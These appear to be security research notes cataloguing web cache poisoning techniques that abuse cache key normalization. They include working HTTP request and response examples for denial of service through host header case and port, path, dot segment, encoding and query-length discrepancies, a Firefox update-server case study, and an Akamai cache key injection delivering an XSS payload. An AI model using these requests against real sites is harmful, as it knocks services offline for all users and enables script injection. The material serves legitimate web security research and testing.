- **Cache Key Normalization Exploitation/ unknown Gadgets**:
	- **`Host Header Case Normalization`**: According to [RFC 4343](https://tools.ietf.org/html/rfc4343), FQDN (Fully qualified domain names) should always be case insensitive, however, for some reason, this is not always respected by frameworks. Interestingly enough, since the host value should be case insensitive, some developers assume it's safe to lowercase the host header value when introducing it into the cache key, without altering the actual request sent to the backend server.
	  
		When pairing the two behaviors, I was able to achieve the following **DoS** attack on a host using a customly configured Varnish as a caching solution.
		![[Pasted image 20241019211846.png]]
		Notice the capitalized host header value, causing a **404** error, which will then be cached by Varnish using the normalized value of the host header in the cache key.
	- **`Host Header Port Transformation`**: If the caching server removes the port from the host header before generating the cache key, but sends the actual host header with port to the origin server, it can be used to **DoS** the homepage.
		For example:
		```
		GET / HTTP/1.1  
		Host: redacted.com:1337  
		  
		HTTP/1.1 301 Moved Permanently  
		Location: https://redacted.com:1337/en  
		CF-Cache-Status: MISS
		```
		Then we remove the port, replay the request, and see if we get a cache hit:
		```
		GET / HTTP/1.1  
		Host: redacted.com  
		  
		HTTP/1.1 301 Moved Permanently  
		Location: https://redacted.com:1337/en  
		CF-Cache-Status: HIT
		```
		Looks like we did. In addition to confirming that this site doesn't include the port in the cache key, we've also just persistently taken down their homepage - anyone who attempts to access this will get a redirect to a dud port, causing a timeout.
	- **`Path Normalization`**: If any part of the path or query string is normalized or excluded from cache key that can alter the response, it can be used to create **DoS**. For Example:
		![[Pasted image 20241019212914.png]]
		Yet again, while trying to increase the cache-hit ratio, developers did not take in consideration potential **DoS** attacks, which allowed me to inject `%2e%2e`(URL encoded `..`) and redirect requests to `/map/4/77/16.png`, which did not exist on the server, therefore leading to the **404**.
	- **`DoS via Dot Segment Normalization`**: If the proxy server (caching server) does dot segment normalization before generating the cache key but the origin server doesn't do such normalization, it could lead to potential **DoS**. The issue arises if the caching server forwards dot segmented path instead of the normalized one which the origin server can't understand -- which means both `/` and `/xxx/../` would hit the same cache key for the cached response but returns different responses. For example:
		```
		"/" would result in a "200 OK" response, but
		"/xxx/../" would result in a "404 Not Found" response.
		```
		So, we can trick the proxy server into caching `404 Not Found` responses for valid requests after the genuine cache expires.
	- **`DoS via Decoding Discrepancies`**: Similarly, if the origin server refuses to decode the URL path or query strings but the caching server does before generating the cache key and forwards the encoded path/query string to the server, it will lead to **DoS** if `404` response are cached. For ex:
		```
		GET /resources/im%61ges/blog.svg HTTP/2
		Host: redacted.com
		
		HTTP/2 404 Not Found
		Cache-Control: max-age=30
		Age: 3
		X-Cache: hit
		
		"Not Found"
		```
	- **`Path Case Normalization`**: During my research, I found that some applications were doing path case normalization before generating the cache key. Which means -- `script.js` and `SCRIPT.js` would hit the same endpoint but returns different responses.
	  For example: 
		```
		GET /SCRIPT.js HTTP/2
		Host: redacted.com
		
		HTTP/2 404 Not Found
		X-Cache: MISS
		``` 
		
		```
		GET /script.js HTTP/2
		Host: redacted.com 
		
		HTTP/2 404 Not Found
		X-Cache: HIT
		```
		This clearly leads to **DoS** if we poison the cache by requesting `SCRIPT.js` after the genuine cache expires. After `404 Not found` response gets cached -- every other request following that poisoned request to genuine endpoint would result in `404 Not Found` response.
	- **`Query Exclusion (414 response)`**: If any specific query is normalized or excluded from the cache key, try to alter the response with it. 
		For Example: 
		```
		GET /assets/anything?excludedQuery=<very-long-string> HTTP/2
		Host: redacted.com

		HTTP/2 414 Request-URI Too Long
		X-Cache: MISS
		```
		If the `414` response if cached by any chance, you will find a simple **DoS**.
		```
		GET /assets/anything HTTP/2
		Host: redacted.com

		HTTP/2 414 Request-URI Too Long
		X-Cache: HIT
		```
	- **`URL Normalization`**: Even something as simple as URL normalization can have serious consequences when applied to a cache key. As a case study, let's take down Firefox's update system. Firefox periodically checks for browser updates by issuing a request to download.mozilla.org:
		```
		GET /?product=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1  
		Host: download.mozilla.org  
		  
		HTTP/1.1 301 Found  
		Location: https://download-installer.cdn.mozilla.net/pub/..firefox-73.mar
		```
		Until recently, the server configuration looked something like:
		```
		server {  
	   proxy_cache_key $http_x_forwarded_proto$proxy_host$uri$is_args$args;  
	   location / {  
		   proxy_pass http://upstream_bouncer;  
		   }  
		}
		```
		There's no issue with the proxy_cache_key setting here; in fact, it's very similar to nginx's default cache key. But if you look at [nginx's documentation for proxy_pass](https://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_pass), you'll find a clue to the problem: **If `proxy_pass` is specified without a URI, the request URI is passed to the server in the same form as sent by a client when the original request is processed**.
		
		The phrase 'in the same form' hints that the forwarded request won't be normalized, whereas the request components stored in the cache key may be. One form of normalization that nginx applies to the cache key is a full URL-decode.
		
		If you issue the update request with an encoded question mark, this will upset the back-end and result in a broken redirect:
		```
		GET /%3fproduct=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1
		Host: download.mozilla.org  
		
		HTTP/1.1 301 Found  
		Location: https://www.mozilla.org/
		```
		But thanks to nginx's URL-decode, it'll have the same cache key as a legitimate update request. So from that point onwards, Firefox will fail to update globally:
		```
		GET /?product=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1 HTTP/1.1  
		Host: download.mozilla.org  
		  
		HTTP/1.1 301 Found  
		Location: https://www.mozilla.org/
		```
	- **`Cache Key Injection - Akamai`**: if a cache like Akamai happens to bundle all the key components into a string without bothering to escape delimiters, we can craft two requests that have the same cache key, even though they are semantically completely different:
		```
		GET /?x=2 HTTP/1.1  
		Origin: '-alert(1)-'__  
		  
		HTTP/1.1 200 OK  
		X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__
		
		<script>…'-alert(1)-'…</script>
		```
		
		```
		GET /?x=2__Origin='-alert(1)-' HTTP/1.1  
		  
		HTTP/1.1 200 OK  
		X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__  
		X-Cache: TCP_HIT  
		  
		<script>…'-alert(1)'-…</script>
		```
		By issuing the first request ourselves, and directing our victim to the second URL, we've made this XSS exploitable. Akamai are working on a fix. Note that if you find this strategy works on the Host header, you can likely get full control over every website using the target CDN.
